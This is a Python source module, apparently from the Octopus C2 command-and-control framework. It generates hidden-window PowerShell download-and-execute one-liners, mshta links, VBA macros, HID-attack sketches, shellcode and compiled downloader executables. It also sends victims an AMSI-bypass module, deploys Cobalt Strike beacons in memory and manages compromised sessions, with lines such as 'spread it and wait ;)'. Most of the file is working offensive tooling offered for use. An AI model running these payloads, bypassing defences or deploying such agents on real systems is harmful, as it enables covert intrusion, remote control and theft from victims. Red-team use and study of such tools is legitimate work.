#!/usr/bin/python

from tabulate import tabulate
import threading
from flask import *
from termcolor import colored
import logging
import base64
import random
import string
from .encryption import *
from profile import *
from config import *
import time
import os
import socket
from socket import SO_REUSEADDR, SOL_SOCKET


requests = []
counter = 1
listener_id = 0
connections_information = {}
listeners_information = {}
commands = {}


key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
iv = "".join([random.choice(string.ascii_uppercase) for i in range(AES.block_size)])

aes_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
aes_iv = base64.b64encode(bytearray(iv, "UTF-8")).decode()

oct_commands = [
    "help", "exit", "interact", "list", "listeners", "listen_http",
    "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe",
    "generate_hta", "generate_macro", "generate_digispark", "delete_listener",
    "generate_spoofed_args_exe", "generate_x86_shellcode",
    "generate_x64_shellcode", "generate_unicorn_macro"
    ]


oct_commands_interact = [
    "load", "help", "exit", "back", "clear",
    "download", "load", "report", "disable_amsi", "modules",
    "deploy_cobalt_beacon"
    ]


def check_url(url):
    if len(listeners_information) > 0:
        for listener in listeners_information:
            if url == listeners_information[listener][5]:
                    return False
            else:
                   return True
    else:
	    return True


def check_listener_name(listener_name):
	if len(listeners_information) > 0:
	    for listener in listeners_information:
		    if listener_name == listeners_information[listener][0]:
			    return False
		    else:
			    return True
	else:
		return True

def check_unicorn():
    if os.path.isfile(unicorn_path):
        command = "python3 %s" % unicorn_path
        results = os.popen(command).read()
        if "Magic Unicorn Attack Vector" in results:
            return True
        else:
            return False
    else:
        return False


def generate_unicorn_macro(hostname, path, interval, proto_to_use, vba_path):
    if check_unicorn():
        print(colored("[+] unicorn path seems good!", "green"))
        # generate octopus powershell agent
        f = open("agents/agent.ps1.oct")
        template = f.read()
        pcode = replace_agent_config_vars(template, proto_to_use, hostname, interval)

        # save octopus powershell agent
        c = random.choice(string.ascii_lowercase)
        tmp_file_code_path = "/tmp/octopus-agent-%s.ps1" % c
        f2 = open(tmp_file_code_path, "w")
        f2.write(pcode)
        f.close()

        # generate vba using unicorn
        command = "python3 %s %s macro 500" % (unicorn_path, tmp_file_code_path)
        result = os.popen(command).read()
        if "Exported powershell output code to powershell_attack.txt":
            # copy macro to dest
            unicorn_abs_path = os.path.abspath(unicorn_path+"/..")
            unicorn_output_path = unicorn_abs_path + "/powershell_attack.txt"
            copy_command = "cp %s %s" % (unicorn_output_path, vba_path)
            copy_result = os.popen(copy_command).read()
            if copy_result == '':
                 print((colored("[+] macro generated successfully !", "green")))
                 print((colored("[+] macro file saved to {0}".format(vba_path), "red")))


    else:
        print(colored("[-] unicorn is not installed or wrong binary selected", "red"))
        print(colored("[*] please check config.py file"))
        exit()

def check_listener_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # dont check standard timeout
    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    try:
        sock.bind((host, port))
        sock.close()
        return True
    except:
        return False


def list_sessions():
	    data = []
	    for key in connections_information:
               data.append(connections_information[key])
	    print(("\n\n" + tabulate(data, ["Session", "IP", "Hostname", "Process Name / PID / Arch", "Username", "Domain", "Last ping", "OS"], "simple") + "\n\n"))


def get_history():
    f = open(".console_history.oct", "r")
    print((f.read()))


def list_listeners():
	    data = []
	    for key in listeners_information:
	        data.append(listeners_information[key])
            # listener_name, ip, port, host, interval, path, listener_name
	    print(("\n\n" + tabulate(data, ["Name", "IP", "Port", "Host", "Interval", "Path", "SSL"], "simple") + "\n\n"))


def completer(text, state):
    options = [i for i in oct_commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None


def completer_interact(text, state):
    options = [i for i in oct_commands_interact if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None


def send_command(session, command):
    encrypted_command = encrypt_command(aes_key, aes_iv, command)
    commands[session] = encrypted_command
    print("[+] Command sent , waiting for results")


def delete(hostname, sid):
    send_command(hostname, "kill $pid")
    time.sleep(5)
    commands.pop(hostname)
    connections_information.pop(sid)
    print(("[+] Session %s killed !"%hostname))


def list_modules():
	if os.path.isdir("modules"):
		modules = os.listdir("modules")
		for module in modules:
			oct_commands_interact.append(module)
			print(module)
	else:
		print((colored("[-] modules directory not Available")))


def log_command(hostname, command, results):
    if os.path.exists("logs/"):
        pass
    else:
        os.mkdir("logs/")
    log_name = hostname + ".log"
    f = open("logs/%s" % log_name, "a")
    data = "Hostname : %s\n" % hostname
    data+= "Command : %s\n" % command
    data+= "Time : %s\n" % time.ctime()
    data+= "Results : %s\n" % results
    data+= str("+" * 30) + "\n"
    f.write(data)
    f.close()


def load_module(session, module_name):
	module = "modules/" + module_name
	if os.path.isfile(module):
		fi = open(module, "r")
		module_content = fi.read()
		# encrypt module before send it
		base64_command = encrypt_command(aes_key, aes_iv, module_content)
		commands[session] = base64_command
		print((colored("[+] Module should be loaded !", "green")))
	else:
		print((colored("[-] Module is not exist !")))


def load_beacon(session, beacon_path):
	fi = open(beacon_path, "r")
	module_content = fi.read()
	# encrypt module before send it
	base64_command = encrypt_command(aes_key, aes_iv, module_content)
	commands[session] = base64_command


def deploy_cobalt_beacon(session, beacon_path):
    # to be updated with threading issue to avoid execution stop
    if os.path.isfile(beacon_path):
        print(colored("[+] Deploying Cobalt Strike Beacon into Octopus agent", "green"))
        print(colored("[+] Disabling AMSI before running the Beacon", "green"))
        disable_amsi(session)
        # wait until the disable amsi loaded correctly
        # need some tests, not stable
        time.sleep(2)
        load_beacon(session, beacon_path)
        print(colored("[+]Cobalt Strike Beacon should be loaded into memory!", "green"))

    else:
        print(colored("[-] Powershell beacon file not exist!"))


def disable_amsi(session):
	amsi_module = "modules/ILBypass.ps1"
	if os.path.isfile(amsi_module):
		fi = open(amsi_module, "r")
		module_content = fi.read()
		base64_command = encrypt_command(aes_key, aes_iv, module_content)
		commands[session] = base64_command
		print((colored("AMSI disable module has been loaded !", "green")))

	else:
		print((colored("[-] AMSI Module is not exist !")))


def generate(hostname, path, proto, interval):
    c = random.choice(string.ascii_lowercase)
    print((colored("#====================", "red")))
    print(("1) powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
    print(("2) powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
    print(("3) powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"\n'.format(hostname, path, proto, c)))
    print("Note - For Windows 7 clients you may need to prefix the payload with " + '"Add-Type -AssemblyName System.Core;"')
    print(("       e.g. powershell -w hidden " + '"Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
    print("Hack your way in ;)")
    print((colored("#====================", "red")))


def generate_hta(host_ip, port, proto):
    print((colored("#====================", "red")))
    print(("mshta " + '{0}://{1}:{2}{3}'.format(proto, host_ip,port, mshta_url)))
    print("spread it and wait ;)")
    print((colored("#====================", "red")))


def generate_digispark(hostname, path, proto, output_path):
    url = "{2}://{0}/{1}".format(hostname, path, proto)
    # Open the ducky template
    ino_template = open("agents/agent.ino")
    template = ino_template.read()
    # Replace the URL
    code = template.replace("OCT_URL", url)
    try:
        f = open(output_path, "w")
        f.write(code)
        f.close()
        print((colored("[+] file generated successfully!", "green")))
    except:
        print("[-] error while generating the file!")


def generate_macro(hostname, path, proto, output_path):
    full_url = "{2}://{0}/{1}".format(hostname, path, proto)
    char = random.choice(string.ascii_uppercase)
    char2 = random.choice(string.ascii_uppercase)
    fake_file_name = "".join([random.choice(string.ascii_uppercase) for i in range(5)])
    ft = open("agents/agent.macro")
    template = ft.read()
    code = template.replace("OCT_URL", full_url)
    code = code.replace("OCTCHAR", char)
    code = code.replace("VARVAR", char2)
    code = code.replace("TEMPTEMP", fake_file_name)
    ft.close()
    try:
        f = open(output_path, "w")
        f.write(code)
        print(colored("[+] Macro generated successfully!", "green"))
        f.close()
    except:
        print(colored("[-] Unable to write file! Please check file path", "red"))


def generate_spoofed_args_exe(hostname, path, proto, output_path):
    # x86_64-w64-mingw32-g++ arguments_spoofer.cpp -o arguments_spoofer.exe -static
    if os.system("which x86_64-w64-mingw32-g++") == 0:
        url = "{2}://{0}/{1}".format(hostname, path, proto)
        ft = open("agents/args_spoofer.cpp")
        char = random.choice(string.ascii_uppercase)
        template = ft.read()
        code = template.replace("OCT_COMMAND", url)
        code = code.replace("OCTCHAR", char)
        f = open("tmp.cpp", "w")
        f.write(code)
        f.close()
        compile_command = "x86_64-w64-mingw32-g++ tmp.cpp -o %s -static" % output_path
        if os.system(compile_command) == 0:
            print((colored("[+] file compiled successfully !", "green")))
            print((colored("[+] binary file saved to {0}".format(output_path), "red")))
            os.system("rm tmp.cpp")
        else:
            print("[-] error while compiling !")


    else:
        print("[-] Mingw compiler is not installed!")


def generate_x64_shellcode(hostname, path, proto_to_use):
    full_url = "{2}://{0}/{1}".format(hostname, path, proto_to_use)
    char = random.choice(string.ascii_uppercase)
    ft = open("agents/octopusx64.asm")
    template = ft.read()
    code = template.replace("OCT_URL", full_url)
    code = code.replace("OCTCHAR", char)
    ft.close()
    fw = open("/tmp/tmpx64.nasm", "w")
    fw.write(code)
    fw.close()
    try:
        compile_nasm_command = "nasm -f win64 /tmp/tmpx64.nasm -o /tmp/tmpx64.obj"
        extract_shellcode_command = "for i in $(objdump -d /tmp/tmpx64.obj |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echo"
        if os.system("which nasm") != 0:
            print(colored("[-] NASM is not installed!"))
        else:
            os.system(compile_nasm_command)
            shellcode = os.popen(extract_shellcode_command).read()
            shellcode_length = shellcode.strip("\n").split("\\")
            print(colored("[+] Shellcode Size : %s Bytes" % len(shellcode_length[1:]), "green"))
            print(colored("[+] Shellcode generated sucessfully!\n", "green"))
            print('unsigned char shellcode[] = "%s"; ' % shellcode.replace("\n", "") + "\n" )
            os.system("rm -rf /tmp/tmpx64.obj")
            os.system("rm -rf /tmp/tmpx64.nasm")

    except:
        print(colored("[-] Unable to generate shellcode!", "red"))


def generate_x86_shellcode(hostname, path, proto_to_use):
    full_url = "{2}://{0}/{1}".format(hostname, path, proto_to_use)
    char = random.choice(string.ascii_uppercase)
    ft = open("agents/octopus.asm")
    template = ft.read()
    code = template.replace("OCT_URL", full_url)
    code = code.replace("OCTCHAR", char)
    ft.close()
    fw = open("/tmp/tmp.nasm", "w")
    fw.write(code)
    fw.close()
    try:
        compile_nasm_command = "nasm -f win32 /tmp/tmp.nasm -o /tmp/tmp.obj"
        extract_shellcode_command = "for i in $(objdump -d /tmp/tmp.obj |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echo"
        if os.system("which nasm") != 0:
            print(colored("[-] NASM is not installed!"))
        else:
            os.system(compile_nasm_command)
            shellcode = os.popen(extract_shellcode_command).read()
            shellcode_length = shellcode.strip("\n").split("\\")
            print(colored("[+] Shellcode Size : %s Bytes" % len(shellcode_length[1:]), "green"))
            print(colored("[+] Shellcode generated sucessfully!\n", "green"))
            print('unsigned char shellcode[] = "%s"; ' % shellcode.replace("\n", "") + "\n" )
            os.system("rm -rf /tmp/tmp.obj")
            os.system("rm -rf /tmp/tmp.nasm")

    except:
        print(colored("[-] Unable to generate shellcode!", "red"))


def random_powershell_generator(powershell_code):
    token1 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token2 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token3 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token4 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token5 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token6 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token7 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token8 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token9 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token10 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token11 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token12 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token13 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token14 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token15 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token16 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token17 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token18 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])
    token19 = "".join([random.choice(string.ascii_uppercase) for i in range(int(random.choice(string.digits[1:])))])

    tokens_to_replace = {
    "TASK_CHECK_INTERVAL": token1,
    "AES_KEY": token2,
    "AES_IV": token3,
    "aesManaged": token4,
    "Create-AesManagedObject": token5,
    "EncryptAES": token6,
    "DecryptAES": token7,
    "unencryptedData": token8,
    "wc3h": token9,
    "EncodedText": token10,
    "wc3": token11,
    "randommm": token12,
    "encryptorrr": token13,
    "whoamiii": token14,
    "fhstname": token15,
    "hehehe": token16,
    "arch22": token17,
    "osos": token18,
    "dddomain": token19

    }

    for token in tokens_to_replace:
        powershell_code = powershell_code.replace(token, tokens_to_replace[token])

    return powershell_code



def generate_exe_powershell_downloader(hostname, path, proto, output_path):
	if os.system("which mono-csc") == 0:
		url = "{2}://{0}/{1}".format(hostname, path, proto)
		ft = open("agents/octopus.cs")
		template = ft.read()
		code = template.replace("OCT_URL", url)
		f = open("tmp.cs", "w")
		f.write(code)
		f.close()
		compile_command = "mono-csc /target:winexe /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
		if os.system(compile_command) == 0:
			print((colored("[+] file compiled successfully !", "green")))
			print((colored("[+] binary file saved to {0}".format(output_path), "red")))
			os.system("rm tmp.cs")
		else:
			print("[-] error while compiling !")
	else:
		print("[-] mono-csc is not installed !")


def main_help_banner():
    print("\n")
    print("Available commands to use :\n")
    print("Hint : the commands with * have arguments and you can see them by typing the command name only\n")
    print("+++++++++")
    print("help  \t\t\t\t\tshow this help menu")
    print("list  \t\t\t\t\tlist all connected agents")
    print("listeners \t\t\t\tlist all listeners")
    print("* generate_powershell \t\t\tgenerate powershell oneliner")
    print("* generate_hta \t\t\t\tgenerate HTA Link")
    print("* generate_unmanaged_exe \t\tgenerate unmanaged executable agent")
    print("* generate_spoofed_args_exe \t\tgenerate executable that fake the powerhell oneliner args")
    print("* generate_digispark \t\t\tgenerate digispark file (HID Attack)")
    print("* generate_x86_shellcode \t\tgenerate 32-bit shellcode the run Octopus agent via CreateProcessA")
    print("* generate_x64_shellcode \t\tgenerate 64-bit shellcode the run Octopus agent via CreateProcessA")
    print("* generate_macro \t\t\tgenerate VBA macro")
    print("* generate_unicorn_macro \t\tgenerate VBA macro based on unicorn")
    print("* listen_http  \t\t\t\tto start a HTTP listener")
    print("* listen_https  \t\t\tto start a HTTPS listener")
    print("interact {session}  \t\t\tto interact with a session")
    print("delete {session}  \t\t\tto delete a session")
    print("delete_listener \t\t\t{listener_name} to delete a listener")
    print("exit \t\t\t\t\texit current session")
    print("\n")


def http_help_banner():
    print("\n##########")
    print("Options info : \n")
    print("BindIP  \t\tIP address that will be used by the listener")
    print("BindPort  \t\tport you want to listen on")
    print("Hostname \t\twill be used to request the payload from")
    print("Interval \t\thow may seconds that agent will wait before check for commands")
    print("URL  \t\t\tpage name will hold the payload")
    print("Listener_name  \t\tlistener name to use\n")


# certficate_path key_path
def https_help_banner():
    print("\n##########")
    print("Options info : \n")
    print("BindIP  \t\tIP that will be used by the listener")
    print("BindPort  \t\tport you want to listen on")
    print("Hostname \t\twill be used to request the payload from")
    print("Interval \t\thow may seconds that agent will wait before check for commands")
    print("URL  \t\t\tpage name will hold the payload")
    print("certficate_path \t the full path for the ssl certficate")
    print("key_path \t\t the full path for the ssl certficate private key\n")
    print("Listener_name  \t\tlistener name to use")


def interact_help():
	print("\n")
	print("Available commands to use :\n")
	print("Hint : if you want to execute system command just type it and wait for the results\n")
	print("+++++++++")
	print("help  \t\t\t\tshow this help menu")
	print("exit/back \t\t\texit current session and back to the main screen")
	print("clear \t\t\t\tclear the screen output")
	print("download \t\t\tdownload file from the target machine")
	print("deploy_cobalt_beacon \t\tdeploy cobalt strike powershell beacon in the current process")
	print("load \t\t\t\tload powershell module to the target machine")
	print("disable_amsi \t\t\tdisable AMSI on the target machine")
	print("report \t\t\t\tget situation report from the target")
	print("\n")


def replace_agent_config_vars(template_str, server_http_protocol, server_hostname, task_check_interval):
    command_host_url = command_send_url.split("/")[1]
    pcode = template_str.replace("OCU_INTERVAL", str(task_check_interval))
    pcode = pcode.replace("OCT_KEY", str(aes_key))
    pcode = pcode.replace("OCT_IV", str(aes_iv))
    pcode = pcode.replace("OCT_first_ping", first_ping_url.split("/")[1])
    pcode = pcode.replace("OCT_command", command_host_url)
    pcode = pcode.replace("OCT_report", report_url.split("/")[1])
    pcode = pcode.replace("OCT_file_receiver", file_receiver_url.split("/")[1])
    pcode = pcode.replace("OCTRECV", command_receiver_url.split("/")[1])
    pcode = pcode.replace("OCU_PROTO", server_http_protocol)
    pcode = pcode.replace("SRVHOST", server_hostname)
    pcode = pcode.replace("OCT_AKILL", str(auto_kill))
    final_code = random_powershell_generator(pcode)
    return final_code


def banner():
	# \033[94m
    version = '\33[43m V1.0 Beta \033[0m'
    Yellow = '\33[33m'
    OKGREEN = '\033[92m'
    CRED = '\033[91m'
    ENDC = '\033[0m'

    banner =  r'''

{0}
      ___           ___                       ___           ___         ___           ___
     /  /\         /  /\          ___        /  /\         /  /\       /__/\         /  /\
    /  /::\       /  /:/         /  /\      /  /::\       /  /::\      \  \:\       /  /:/_
   /  /:/\:\     /  /:/         /  /:/     /  /:/\:\     /  /:/\:\      \  \:\     /  /:/ /\
  /  /:/  \:\   /  /:/  ___    /  /:/     /  /:/  \:\   /  /:/~/:/  ___  \  \:\   /  /:/ /::\
 /__/:/ \__\:\ /__/:/  /  /\  /  /::\    /__/:/ \__\:\ /__/:/ /:/  /__/\  \__\:\ /__/:/ /:/\:\
 \  \:\ /  /:/ \  \:\ /  /:/ /__/:/\:\   \  \:\ /  /:/ \  \:\/:/   \  \:\ /  /:/ \  \:\/:/~/:/
  \  \:\  /:/   \  \:\  /:/  \__\/  \:\   \  \:\  /:/   \  \::/     \  \:\  /:/   \  \::/ /:/
   \  \:\/:/     \  \:\/:/        \  \:\   \  \:\/:/     \  \:\      \  \:\/:/     \__\/ /:/
    \  \::/       \  \::/          \__\/    \  \::/       \  \:\      \  \::/        /__/:/
     \__\/         \__\/                     \__\/         \__\/       \__\/         \__\/
{1}

                    {3}v1.2 stable !{1}


{2} Octopus C2 | Control your shells {1}

'''


    print((banner.format(CRED, ENDC, OKGREEN, Yellow)))
